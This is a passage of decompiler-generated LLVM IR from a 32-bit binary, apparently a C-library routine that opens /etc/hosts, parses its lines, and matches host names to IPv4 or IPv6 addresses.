  br i1 %tmp152, label %dec_label_pc_8057b19, label %dec_label_pc_80578bb

dec_label_pc_80578bb:                             ; preds = %dec_label_pc_80578b2
  %v1_80578bb = add i32 %v0_80578a6, -48
  store i32 %v1_80578bb, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_80578bb, 8
  br i1 %tmp153, label %dec_label_pc_8057b19, label %dec_label_pc_80578c7

dec_label_pc_80578c7:                             ; preds = %dec_label_pc_80578bb
  %v0_80578c7 = load i32, i32* @ebx, align 4
  %v1_80578c7 = add i32 %v0_80578c7, 48
  %v1_80578ca = add i32 %v0_80578a6, -44
  store i32 %v1_80578ca, i32* @ebp, align 4
  %v1_80578d1 = add i32 %v0_80578a6, -56
  store i32 %v1_80578d1, i32* @eax, align 4
  %v1_80578d4 = add i32 %v0_80578c7, 36
  store i32 %v1_80578d4, i32* @edi, align 4
  %v7_80578d7 = icmp ult i32 %v1_80578d1, %v1_80578ca
  br i1 %v7_80578d7, label %dec_label_pc_80578e0, label %dec_label_pc_80578db

dec_label_pc_80578db:                             ; preds = %dec_label_pc_80578c7
  %v1_80578db = add i32 %v0_80578c7, 44
  store i32 %v1_80578db, i32* @esi, align 4
  br label %dec_label_pc_80578e5

dec_label_pc_80578e0:                             ; preds = %dec_label_pc_80578c7
  %v1_80578e0 = add i32 %v0_80578c7, 56
  store i32 %v1_80578e0, i32* @esi, align 4
  store i32 %v1_80578d1, i32* @ebp, align 4
  br label %dec_label_pc_80578e5

dec_label_pc_80578e5:                             ; preds = %dec_label_pc_80578db, %dec_label_pc_80578e0
  %v0_80578e5 = phi i32 [ %v1_80578ca, %dec_label_pc_80578db ], [ %v1_80578d1, %dec_label_pc_80578e0 ]
  %tmp154 = icmp ult i32 %v0_80578e5, 80
  br i1 %tmp154, label %dec_label_pc_8057b19, label %dec_label_pc_80578ee

dec_label_pc_80578ee:                             ; preds = %dec_label_pc_80578e5
  %v0_80578ee = call i32 @__open_etc_hosts()
  store i32 %v0_80578ee, i32* %eax.global-to-local, align 4
  %v1_80578f7 = icmp eq i32 %v0_80578ee, 0
  br i1 %v1_80578f7, label %dec_label_pc_805791b, label %dec_label_pc_80578fb

dec_label_pc_80578fb:                             ; preds = %dec_label_pc_80578ee
  store i32 %v1_805787e, i32* %edx.global-to-local, align 4
  store i32 %v1_80578c7, i32* %eax.global-to-local, align 4
  store i8* %v5_8057884, i8** %stack_var_-44, align 4
  %v0_8057906 = load i32, i32* @edi, align 4
  %v0_8057912 = load i32, i32* @esi, align 4
  %v5_8057912 = inttoptr i32 %v0_8057912 to i8*
  br label %dec_label_pc_80579c9

dec_label_pc_805791b:                             ; preds = %dec_label_pc_80578ee
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805791f = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805791f, align 4
  %v1_8057925 = call i32 @__errno_location(i32 0)
  store i32 %v1_8057925, i32* %eax.global-to-local, align 4
  %v1_805792a = inttoptr i32 %v1_8057925 to i32*
  %v2_805792a = load i32, i32* %v1_805792a, align 4
  store i32 %v2_805792a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057b19

dec_label_pc_8057935:                             ; preds = %dec_label_pc_8057a9c
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8057939 = load i8*, i8** %stack_var_-44, align 4
  %v3_8057939 = ptrtoint i8* %v2_8057939 to i32
  %v2_805793c = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8057939, i32* %v2_805793c, align 4
  %v0_805793e = load i32, i32* %eax.global-to-local, align 4
  %v1_805793e = add i32 %v0_805793e, 4
  %v2_805793e = inttoptr i32 %v1_805793e to i32*
  store i32 0, i32* %v2_805793e, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8057949 = load i32, i32* @ebx, align 4
  %v1_8057949 = add i32 %v0_8057949, 4
  %v2_8057949 = inttoptr i32 %v1_8057949 to i32*
  %v3_8057949 = load i32, i32* %v2_8057949, align 4
  store i32 %v3_8057949, i32* %eax.global-to-local, align 4
  store i32 %v3_8057949, i32* %arg5, align 4
  %v0_805794e = load i32, i32* %edx.global-to-local, align 4
  %v1_805794e = add i32 %v0_805794e, 8
  %v2_805794e = inttoptr i32 %v1_805794e to i32*
  store i32 2, i32* %v2_805794e, align 4
  %v0_8057955 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057955 = add i32 %v0_8057955, 12
  %v2_8057955 = inttoptr i32 %v1_8057955 to i32*
  store i32 4, i32* %v2_8057955, align 4
  br label %dec_label_pc_805798e

dec_label_pc_8057962:                             ; preds = %dec_label_pc_8057abe
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_805796a = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_805796a, align 4
  %v0_805796c = load i32, i32* %edx.global-to-local, align 4
  %v1_805796c = add i32 %v0_805796c, 4
  %v2_805796c = inttoptr i32 %v1_805796c to i32*
  store i32 0, i32* %v2_805796c, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8057977 = load i32, i32* @ebx, align 4
  %v1_8057977 = add i32 %v0_8057977, 4
  %v2_8057977 = inttoptr i32 %v1_8057977 to i32*
  %v3_8057977 = load i32, i32* %v2_8057977, align 4
  store i32 %v3_8057977, i32* %eax.global-to-local, align 4
  store i32 %v3_8057977, i32* %arg5, align 4
  %v0_805797c = load i32, i32* %edx.global-to-local, align 4
  %v1_805797c = add i32 %v0_805797c, 8
  %v2_805797c = inttoptr i32 %v1_805797c to i32*
  store i32 10, i32* %v2_805797c, align 4
  %v0_8057983 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057983 = add i32 %v0_8057983, 12
  %v2_8057983 = inttoptr i32 %v1_8057983 to i32*
  store i32 16, i32* %v2_8057983, align 4
  br label %dec_label_pc_805798e

dec_label_pc_805798e:                             ; preds = %dec_label_pc_8057935, %dec_label_pc_8057962
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8057935 ], [ %stack_var_-32.0, %dec_label_pc_8057962 ]
  %v1_805798e = load i32, i32* %edx.global-to-local, align 4
  %v2_805798e = add i32 %v1_805798e, 16
  %v3_805798e = inttoptr i32 %v2_805798e to i32*
  store i32 %storemerge, i32* %v3_805798e, align 4
  %v0_8057991 = load i32, i32* @ebx, align 4
  %v1_8057991 = add i32 %v0_8057991, 8
  %v1_8057994 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057994 = add i32 %v1_8057994, 4
  %v3_8057994 = inttoptr i32 %v2_8057994 to i32*
  store i32 %v1_8057991, i32* %v3_8057994, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_805799b = load i32, i32* %edx.global-to-local, align 4
  %v2_805799b = inttoptr i32 %arg8 to i32*
  store i32 %v0_805799b, i32* %v2_805799b, align 4
  br label %dec_label_pc_8057af9

dec_label_pc_80579aa:                             ; preds = %dec_label_pc_805787e
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80579c9

dec_label_pc_80579c9:                             ; preds = %dec_label_pc_80578fb, %dec_label_pc_80579aa
  %v1_80579cd.pre-phi = phi i32* [ %v1_805789a, %dec_label_pc_80578fb ], [ %.pre, %dec_label_pc_80579aa ]
  %stack_var_-32.0 = phi i32 [ %v1_80578c7, %dec_label_pc_80578fb ], [ 0, %dec_label_pc_80579aa ]
  %stack_var_-36.0 = phi i32 [ %v1_805787e, %dec_label_pc_80578fb ], [ 0, %dec_label_pc_80579aa ]
  %stack_var_-40.0 = phi i32 [ %v0_8057906, %dec_label_pc_80578fb ], [ 0, %dec_label_pc_80579aa ]
  %stack_var_4.0 = phi i32 [ %v0_80578ee, %dec_label_pc_80578fb ], [ %arg1, %dec_label_pc_80579aa ]
  %stack_var_-20.0 = phi i8* [ %v5_8057912, %dec_label_pc_80578fb ], [ %v5_8057884, %dec_label_pc_80579aa ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80579cd.pre-phi, align 4
  %v4_8057ae5 = ptrtoint i8* %stack_var_-20.0 to i32
  %v4_8057a82 = inttoptr i32 %arg2 to i8*
  %v0_8057adf120127 = load i32, i32* @edx, align 4
  %v3_8057ae9121128 = call i32 @fgets(i32 %v4_8057ae5, i32 %stack_var_4.0, i32 %v0_8057adf120127)
  store i32 %v3_8057ae9121128, i32* @eax, align 4
  %v1_8057af1122129 = icmp eq i32 %v3_8057ae9121128, 0
  %v1_8057af3123130 = icmp eq i1 %v1_8057af1122129, false
  br i1 %v1_8057af3123130, label %dec_label_pc_80579e0.lr.ph.lr.ph, label %dec_label_pc_8057af9

dec_label_pc_80579e0.lr.ph.lr.ph:                 ; preds = %dec_label_pc_80579c9
  %v12_8057ab7 = icmp eq i32 %arg3, 10
  %v12_8057a95 = icmp eq i32 %arg3, 2
  %v12_8057a5c = icmp eq i32 %arg4, 2
  %v1_8057a61 = icmp eq i1 %v12_8057a5c, false
  %v1_8057a9a = icmp eq i1 %v12_8057a95, false
  %v1_8057abc = icmp eq i1 %v12_8057ab7, false
  br label %dec_label_pc_80579e0.lr.ph

dec_label_pc_80579e0.lr.ph:                       ; preds = %dec_label_pc_80579e0.lr.ph.lr.ph, %dec_label_pc_8057adf.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_80579e0.lr.ph.lr.ph ], [ 2, %dec_label_pc_8057adf.outer.backedge ]
  br label %dec_label_pc_80579e0

dec_label_pc_80579e0:                             ; preds = %dec_label_pc_80579e0.lr.ph, %dec_label_pc_8057adf.backedge
  %v3_80579e8 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_80579e8, i32* @eax, align 4
  %v1_80579f0 = icmp eq i32 %v3_80579e8, 0
  br i1 %v1_80579f0, label %dec_label_pc_80579f7, label %dec_label_pc_80579f4

dec_label_pc_80579f4:                             ; preds = %dec_label_pc_80579e0
  %v1_80579f4 = inttoptr i32 %v3_80579e8 to i8*
  store i8 0, i8* %v1_80579f4, align 1
  br label %dec_label_pc_80579f7

dec_label_pc_80579f7:                             ; preds = %dec_label_pc_80579e0, %dec_label_pc_80579f4
  store i32 %v4_8057ae5, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8057a3732 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8057a3733 = icmp eq i8 %v2_8057a3732, 0
  %v1_8057a3a39 = icmp eq i1 %v3_8057a3733, false
  br i1 %v1_8057a3a39, label %dec_label_pc_8057a03.preheader.preheader, label %dec_label_pc_8057a3c

dec_label_pc_8057a03.preheader.preheader:         ; preds = %dec_label_pc_80579f7
  %v4_8057a0397.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057a03.preheader

dec_label_pc_80579ff:                             ; preds = %dec_label_pc_8057a09
  store i8 0, i8* %v1_8057a03102, align 1
  %v0_8057a02 = load i32, i32* @ecx, align 4
  %v1_8057a02 = add i32 %v0_8057a02, 1
  store i32 %v1_8057a02, i32* @ecx, align 4
  %v1_8057a03 = inttoptr i32 %v1_8057a02 to i8*
  %v2_8057a03 = load i8, i8* %v1_8057a03, align 1
  %v3_8057a03 = zext i8 %v2_8057a03 to i32
  %v4_8057a03 = load i32, i32* %eax.global-to-local, align 4
  %v5_8057a03 = and i32 %v4_8057a03, -256
  %v6_8057a03 = or i32 %v5_8057a03, %v3_8057a03
  store i32 %v6_8057a03, i32* @eax, align 4
  %v4_8057a05 = icmp eq i8 %v2_8057a03, 0
  br i1 %v4_8057a05, label %dec_label_pc_8057a03.dec_label_pc_8057a3c.loopexit_crit_edge, label %dec_label_pc_8057a09

dec_label_pc_8057a09:                             ; preds = %dec_label_pc_8057a03.preheader, %dec_label_pc_80579ff
  %v2_8057a03103 = phi i8 [ %v2_8057a03, %dec_label_pc_80579ff ], [ %v2_8057a0395, %dec_label_pc_8057a03.preheader ]
  %v1_8057a03102 = phi i8* [ %v1_8057a03, %dec_label_pc_80579ff ], [ %v1_8057a0394, %dec_label_pc_8057a03.preheader ]
  %v0_80579ff101 = phi i32 [ %v1_8057a02, %dec_label_pc_80579ff ], [ %v0_8057a0347, %dec_label_pc_8057a03.preheader ]
  %v2_8057a09 = sext i8 %v2_8057a03103 to i32
  store i32 %v2_8057a09, i32* @edx, align 4
  %v0_8057a0c = load i32, i32* @global_var_805f61c, align 4
  store i32 %v0_8057a0c, i32* %eax.global-to-local, align 4
  %v2_8057a11 = mul nsw i32 %v2_8057a09, 2
  %v3_8057a11 = add i32 %v0_8057a0c, %v2_8057a11
  %v4_8057a11 = inttoptr i32 %v3_8057a11 to i8*
  %v5_8057a11 = load i8, i8* %v4_8057a11, align 1
  %v6_8057a11 = and i8 %v5_8057a11, 32
  %v7_8057a11 = icmp eq i8 %v6_8057a11, 0
  %v1_8057a15 = icmp eq i1 %v7_8057a11, false
  br i1 %v1_8057a15, label %dec_label_pc_80579ff, label %dec_label_pc_8057a17

dec_label_pc_8057a17:                             ; preds = %dec_label_pc_8057a09
  %v0_8057a17 = load i32, i32* @edi, align 4
  %v1_8057a17 = add i32 %v0_8057a17, -6
  %v6_8057a17 = sub i32 5, %v0_8057a17
  %v7_8057a17 = and i32 %v6_8057a17, %v0_8057a17
  %v8_8057a17 = icmp slt i32 %v7_8057a17, 0
  %v9_8057a17 = icmp eq i32 %v1_8057a17, 0
  %v10_8057a17 = icmp slt i32 %v1_8057a17, 0
  %v3_8057a1a = icmp eq i1 %v10_8057a17, %v8_8057a17
  %v4_8057a1a = icmp eq i1 %v9_8057a17, false
  %v5_8057a1a = and i1 %v4_8057a1a, %v3_8057a1a
  br i1 %v5_8057a1a, label %dec_label_pc_8057a23.preheader, label %dec_label_pc_8057a1c

dec_label_pc_8057a1c:                             ; preds = %dec_label_pc_8057a17
  %v1_8057a1c = load i32, i32* @ebx, align 4
  %v3_8057a1c = mul i32 %v0_8057a17, 4
  %v4_8057a1c = add i32 %v1_8057a1c, %v3_8057a1c
  %v5_8057a1c = inttoptr i32 %v4_8057a1c to i32*
  store i32 %v0_80579ff101, i32* %v5_8057a1c, align 4
  %v0_8057a1f = load i32, i32* @edi, align 4
  %v1_8057a1f = add i32 %v0_8057a1f, 1
  store i32 %v1_8057a1f, i32* @edi, align 4
  %v0_8057a23.pre.pre = load i32, i32* @ecx, align 4
  %v4_8057a23.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057a23.preheader

dec_label_pc_8057a23.preheader:                   ; preds = %dec_label_pc_8057a1c, %dec_label_pc_8057a17
  %v4_8057a23.pre = phi i32 [ %v4_8057a23.pre.pre, %dec_label_pc_8057a1c ], [ %v0_8057a0c, %dec_label_pc_8057a17 ]
  %v0_8057a23.pre = phi i32 [ %v0_8057a23.pre.pre, %dec_label_pc_8057a1c ], [ %v0_80579ff101, %dec_label_pc_8057a17 ]
  %v1_8057a3c52 = phi i32 [ %v1_8057a1f, %dec_label_pc_8057a1c ], [ %v0_8057a17, %dec_label_pc_8057a17 ]
  %v1_8057a23104 = inttoptr i32 %v0_8057a23.pre to i8*
  %v2_8057a23105 = load i8, i8* %v1_8057a23104, align 1
  %v3_8057a23106 = zext i8 %v2_8057a23105 to i32
  %v5_8057a23107 = and i32 %v4_8057a23.pre, -256
  %v6_8057a23108 = or i32 %v3_8057a23106, %v5_8057a23107
  store i32 %v6_8057a23108, i32* @eax, align 4
  %v4_8057a25109 = icmp eq i8 %v2_8057a23105, 0
  br i1 %v4_8057a25109, label %dec_label_pc_8057a37.loopexit, label %dec_label_pc_8057a29.lr.ph

dec_label_pc_8057a29.lr.ph:                       ; preds = %dec_label_pc_8057a23.preheader
  %v0_8057a2c.pre = load i32, i32* @global_var_805f61c, align 4
  br label %dec_label_pc_8057a29

dec_label_pc_8057a22:                             ; preds = %dec_label_pc_8057a29
  %v1_8057a22 = add i32 %v0_8057a37110, 1
  store i32 %v1_8057a22, i32* @ecx, align 4
  %v1_8057a23 = inttoptr i32 %v1_8057a22 to i8*
  %v2_8057a23 = load i8, i8* %v1_8057a23, align 1
  %v3_8057a23 = zext i8 %v2_8057a23 to i32
  %v5_8057a23 = and i32 %v0_8057a2c.pre, -256
  %v6_8057a23 = or i32 %v3_8057a23, %v5_8057a23
  store i32 %v6_8057a23, i32* @eax, align 4
  %v4_8057a25 = icmp eq i8 %v2_8057a23, 0
  br i1 %v4_8057a25, label %dec_label_pc_8057a37.loopexit, label %dec_label_pc_8057a29

dec_label_pc_8057a29:                             ; preds = %dec_label_pc_8057a29.lr.ph, %dec_label_pc_8057a22
  %v2_8057a23112 = phi i8 [ %v2_8057a23105, %dec_label_pc_8057a29.lr.ph ], [ %v2_8057a23, %dec_label_pc_8057a22 ]
  %v1_8057a23111 = phi i8* [ %v1_8057a23104, %dec_label_pc_8057a29.lr.ph ], [ %v1_8057a23, %dec_label_pc_8057a22 ]
  %v0_8057a37110 = phi i32 [ %v0_8057a23.pre, %dec_label_pc_8057a29.lr.ph ], [ %v1_8057a22, %dec_label_pc_8057a22 ]
  %v2_8057a29 = sext i8 %v2_8057a23112 to i32
  store i32 %v2_8057a29, i32* @edx, align 4
  store i32 %v0_8057a2c.pre, i32* @eax, align 4
  %v2_8057a31 = mul nsw i32 %v2_8057a29, 2
  %v3_8057a31 = add i32 %v0_8057a2c.pre, %v2_8057a31
  %v4_8057a31 = inttoptr i32 %v3_8057a31 to i8*
  %v5_8057a31 = load i8, i8* %v4_8057a31, align 1
  %v6_8057a31 = and i8 %v5_8057a31, 32
  %v7_8057a31 = icmp eq i8 %v6_8057a31, 0
  br i1 %v7_8057a31, label %dec_label_pc_8057a22, label %dec_label_pc_8057a37.loopexit

dec_label_pc_8057a37.loopexit:                    ; preds = %dec_label_pc_8057a29, %dec_label_pc_8057a22, %dec_label_pc_8057a23.preheader
  %v4_8057a0397144 = phi i32 [ %v6_8057a23108, %dec_label_pc_8057a23.preheader ], [ %v6_8057a23, %dec_label_pc_8057a22 ], [ %v0_8057a2c.pre, %dec_label_pc_8057a29 ]
  %v0_8057a37.lcssa = phi i32 [ %v0_8057a23.pre, %dec_label_pc_8057a23.preheader ], [ %v1_8057a22, %dec_label_pc_8057a22 ], [ %v0_8057a37110, %dec_label_pc_8057a29 ]
  %v1_8057a23.lcssa = phi i8* [ %v1_8057a23104, %dec_label_pc_8057a23.preheader ], [ %v1_8057a23, %dec_label_pc_8057a22 ], [ %v1_8057a23111, %dec_label_pc_8057a29 ]
  %v2_8057a37 = load i8, i8* %v1_8057a23.lcssa, align 1
  %v3_8057a37 = icmp eq i8 %v2_8057a37, 0
  %v1_8057a3a = icmp eq i1 %v3_8057a37, false
  br i1 %v1_8057a3a, label %dec_label_pc_8057a03.preheader, label %dec_label_pc_8057a3c

dec_label_pc_8057a03.preheader:                   ; preds = %dec_label_pc_8057a03.preheader.preheader, %dec_label_pc_8057a37.loopexit
  %v1_8057a3c.pre147 = phi i32 [ %v1_8057a3c52, %dec_label_pc_8057a37.loopexit ], [ 0, %dec_label_pc_8057a03.preheader.preheader ]
  %v4_8057a0397 = phi i32 [ %v4_8057a0397144, %dec_label_pc_8057a37.loopexit ], [ %v4_8057a0397.pre, %dec_label_pc_8057a03.preheader.preheader ]
  %v0_8057a0347 = phi i32 [ %v0_8057a37.lcssa, %dec_label_pc_8057a37.loopexit ], [ %v4_8057ae5, %dec_label_pc_8057a03.preheader.preheader ]
  %v1_8057a0394 = inttoptr i32 %v0_8057a0347 to i8*
  %v2_8057a0395 = load i8, i8* %v1_8057a0394, align 1
  %v3_8057a0396 = zext i8 %v2_8057a0395 to i32
  %v5_8057a0398 = and i32 %v4_8057a0397, -256
  %v6_8057a0399 = or i32 %v5_8057a0398, %v3_8057a0396
  store i32 %v6_8057a0399, i32* @eax, align 4
  %v4_8057a05100 = icmp eq i8 %v2_8057a0395, 0
  br i1 %v4_8057a05100, label %dec_label_pc_8057a3c, label %dec_label_pc_8057a09

dec_label_pc_8057a03.dec_label_pc_8057a3c.loopexit_crit_edge: ; preds = %dec_label_pc_80579ff
  %v1_8057a3c.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057a3c

dec_label_pc_8057a3c:                             ; preds = %dec_label_pc_8057a37.loopexit, %dec_label_pc_8057a03.dec_label_pc_8057a3c.loopexit_crit_edge, %dec_label_pc_8057a03.preheader, %dec_label_pc_80579f7
  %v1_8057a3c = phi i32 [ 0, %dec_label_pc_80579f7 ], [ %v1_8057a3c.pre.pre, %dec_label_pc_8057a03.dec_label_pc_8057a3c.loopexit_crit_edge ], [ %v1_8057a3c.pre147, %dec_label_pc_8057a03.preheader ], [ %v1_8057a3c52, %dec_label_pc_8057a37.loopexit ]
  %v0_8057a3c = load i32, i32* @ebx, align 4
  %v2_8057a3c = mul i32 %v1_8057a3c, 4
  %v3_8057a3c = add i32 %v2_8057a3c, %v0_8057a3c
  %v4_8057a3c = inttoptr i32 %v3_8057a3c to i32*
  store i32 0, i32* %v4_8057a3c, align 4
  %v0_8057a43 = load i32, i32* @edi, align 4
  %v7_8057a46 = icmp sgt i32 %v0_8057a43, 1
  br i1 %v7_8057a46, label %dec_label_pc_8057a4c, label %dec_label_pc_8057adf.backedge

dec_label_pc_8057a4c:                             ; preds = %dec_label_pc_8057a3c
  br i1 %v12_8057888, label %dec_label_pc_8057b19, label %dec_label_pc_8057a57

dec_label_pc_8057a57:                             ; preds = %dec_label_pc_8057a4c
  store i32 1, i32* @esi, align 4
  br i1 %v1_8057a61, label %dec_label_pc_8057a79.lr.ph, label %dec_label_pc_8057a63

dec_label_pc_8057a79.lr.ph:                       ; preds = %dec_label_pc_8057a57
  %v0_8057a79.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057a79

dec_label_pc_8057a63:                             ; preds = %dec_label_pc_8057a57
  %v0_8057a63 = load i32, i32* @eax, align 4
  %v0_8057a65 = load i32, i32* @ebx, align 4
  %v1_8057a65 = inttoptr i32 %v0_8057a65 to i32*
  %v2_8057a65 = load i32, i32* %v1_8057a65, align 4
  %v5_8057a6b = call i32 @__GI_strcoll(i8* %v4_8057a82, i32 %v2_8057a65, i32 %v0_8057a63, i32 %v0_8057a63)
  store i32 %v5_8057a6b, i32* %eax.global-to-local, align 4
  %v1_8057a73 = icmp eq i32 %v5_8057a6b, 0
  %v1_8057a75 = icmp eq i1 %v1_8057a73, false
  br i1 %v1_8057a75, label %dec_label_pc_8057adf.backedge, label %dec_label_pc_8057a95

dec_label_pc_8057adf.backedge:                    ; preds = %dec_label_pc_8057a8e, %dec_label_pc_8057a63, %dec_label_pc_8057a3c
  %v0_8057adf = load i32, i32* @edx, align 4
  %v3_8057ae9 = call i32 @fgets(i32 %v4_8057ae5, i32 %stack_var_4.0, i32 %v0_8057adf)
  store i32 %v3_8057ae9, i32* @eax, align 4
  %v1_8057af1 = icmp eq i32 %v3_8057ae9, 0
  %v1_8057af3 = icmp eq i1 %v1_8057af1, false
  br i1 %v1_8057af3, label %dec_label_pc_80579e0, label %dec_label_pc_8057af9

dec_label_pc_8057a79:                             ; preds = %dec_label_pc_8057a79.lr.ph, %dec_label_pc_8057a8e
  %v0_8057a79 = phi i32 [ %v0_8057a79.pre, %dec_label_pc_8057a79.lr.ph ], [ %v5_8057a82, %dec_label_pc_8057a8e ]
  %v1_8057a7b119 = phi i32 [ 1, %dec_label_pc_8057a79.lr.ph ], [ %v1_8057a8e, %dec_label_pc_8057a8e ]
  %v0_8057a7b = load i32, i32* @ebx, align 4
  %v2_8057a7b = mul i32 %v1_8057a7b119, 4
  %v3_8057a7b = add i32 %v0_8057a7b, %v2_8057a7b
  %v4_8057a7b = inttoptr i32 %v3_8057a7b to i32*
  %v5_8057a7b = load i32, i32* %v4_8057a7b, align 4
  %v5_8057a82 = call i32 @__GI_strcasecmp(i8* %v4_8057a82, i32 %v5_8057a7b, i32 %v0_8057a79, i32 %v0_8057a79)
  store i32 %v5_8057a82, i32* %eax.global-to-local, align 4
  %v1_8057a8a = icmp eq i32 %v5_8057a82, 0
  br i1 %v1_8057a8a, label %dec_label_pc_8057a95, label %dec_label_pc_8057a8e

dec_label_pc_8057a8e:                             ; preds = %dec_label_pc_8057a79
  %v0_8057a8e = load i32, i32* @esi, align 4
  %v1_8057a8e = add i32 %v0_8057a8e, 1
  store i32 %v1_8057a8e, i32* @esi, align 4
  %v1_8057a8f.pre = load i32, i32* @edi, align 4
  %v5_8057a91 = icmp slt i32 %v1_8057a8e, %v1_8057a8f.pre
  br i1 %v5_8057a91, label %dec_label_pc_8057a79, label %dec_label_pc_8057adf.backedge

dec_label_pc_8057a95:                             ; preds = %dec_label_pc_8057a63, %dec_label_pc_8057a79
  br i1 %v1_8057a9a, label %dec_label_pc_8057ab7, label %dec_label_pc_8057a9c

dec_label_pc_8057a9c:                             ; preds = %dec_label_pc_8057a95
  %v0_8057a9c = load i32, i32* @esi, align 4
  %v3_8057a9d = load i8*, i8** %stack_var_-44, align 4
  %v4_8057a9d = ptrtoint i8* %v3_8057a9d to i32
  %v0_8057aa1 = load i32, i32* @ebx, align 4
  %v1_8057aa1 = inttoptr i32 %v0_8057aa1 to i32*
  %v2_8057aa1 = load i32, i32* %v1_8057aa1, align 4
  %v4_8057aa5 = inttoptr i32 %v2_8057aa1 to i8*
  %v5_8057aa5 = call i32 @inet_pton(i32 2, i8* %v4_8057aa5, i32 %v4_8057a9d, i32 %v0_8057a9c)
  store i32 %v5_8057aa5, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8057aa5, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8057935, label %dec_label_pc_8057adf.outer.backedge

dec_label_pc_8057adf.outer.backedge:              ; preds = %dec_label_pc_8057a9c, %dec_label_pc_8057abe, %dec_label_pc_8057ab7
  %v0_8057adf120 = load i32, i32* @edx, align 4
  %v3_8057ae9121 = call i32 @fgets(i32 %v4_8057ae5, i32 %stack_var_4.0, i32 %v0_8057adf120)
  store i32 %v3_8057ae9121, i32* @eax, align 4
  %v1_8057af1122 = icmp eq i32 %v3_8057ae9121, 0
  %v1_8057af3123 = icmp eq i1 %v1_8057af1122, false
  br i1 %v1_8057af3123, label %dec_label_pc_80579e0.lr.ph, label %dec_label_pc_8057af9

dec_label_pc_8057ab7:                             ; preds = %dec_label_pc_8057a95
  br i1 %v1_8057abc, label %dec_label_pc_8057adf.outer.backedge, label %dec_label_pc_8057abe

dec_label_pc_8057abe:                             ; preds = %dec_label_pc_8057ab7
  %v0_8057abe = load i32, i32* @ecx, align 4
  %v0_8057ac3 = load i32, i32* @ebx, align 4
  %v1_8057ac3 = inttoptr i32 %v0_8057ac3 to i32*
  %v2_8057ac3 = load i32, i32* %v1_8057ac3, align 4
  %v4_8057ac7 = inttoptr i32 %v2_8057ac3 to i8*
  %v5_8057ac7 = call i32 @inet_pton(i32 10, i8* %v4_8057ac7, i32 %stack_var_-36.0, i32 %v0_8057abe)
  store i32 %v5_8057ac7, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_8057ac7, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8057962, label %dec_label_pc_8057adf.outer.backedge

dec_label_pc_8057af9:                             ; preds = %dec_label_pc_8057adf.outer.backedge, %dec_label_pc_80579c9, %dec_label_pc_8057adf.backedge, %dec_label_pc_805798e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805798e ], [ 1, %dec_label_pc_80579c9 ], [ 2, %dec_label_pc_8057adf.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_8057adf.backedge ]
  br i1 %v12_8057888, label %dec_label_pc_8057b19, label %dec_label_pc_8057b00

dec_label_pc_8057b00:                             ; preds = %dec_label_pc_8057af9
  %v1_8057b07 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8057b07 = call i32 @__GI_fclose(i16* %v1_8057b07)
  store i32 %v2_8057b07, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057b19

dec_label_pc_8057b19:                             ; preds = %dec_label_pc_8057a4c, %dec_label_pc_8057869, %dec_label_pc_8057875, %dec_label_pc_8057893, %dec_label_pc_80578a6, %dec_label_pc_80578b2, %dec_label_pc_80578bb, %dec_label_pc_80578e5, %dec_label_pc_8057af9, %dec_label_pc_8057b00, %dec_label_pc_805791b
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8057af9 ], [ %stack_var_-28.1, %dec_label_pc_8057b00 ], [ %v2_805792a, %dec_label_pc_805791b ], [ 34, %dec_label_pc_80578e5 ], [ 34, %dec_label_pc_80578bb ], [ 34, %dec_label_pc_80578b2 ], [ 34, %dec_label_pc_80578a6 ], [ 34, %dec_label_pc_8057893 ], [ 34, %dec_label_pc_8057875 ], [ 34, %dec_label_pc_8057869 ], [ %stack_var_-28.0.ph131, %dec_label_pc_8057a4c ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8057854, i32* @ebx, align 4
  store i32 %v0_8057853, i32* @esi, align 4
  store i32 %v0_8057852, i32* @edi, align 4
  store i32 %v0_8057851, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8057a8e, { 0, 2, 1 }
  uselistorder i32 %v5_8057a82, { 1, 2, 0 }
  uselistorder i32 %v0_8057a79, { 1, 0 }
  uselistorder i8 %v2_8057a0395, { 1, 2, 0 }
  uselistorder i8* %v1_8057a0394, { 1, 0 }
  uselistorder i32 %v0_8057a0347, { 1, 0 }
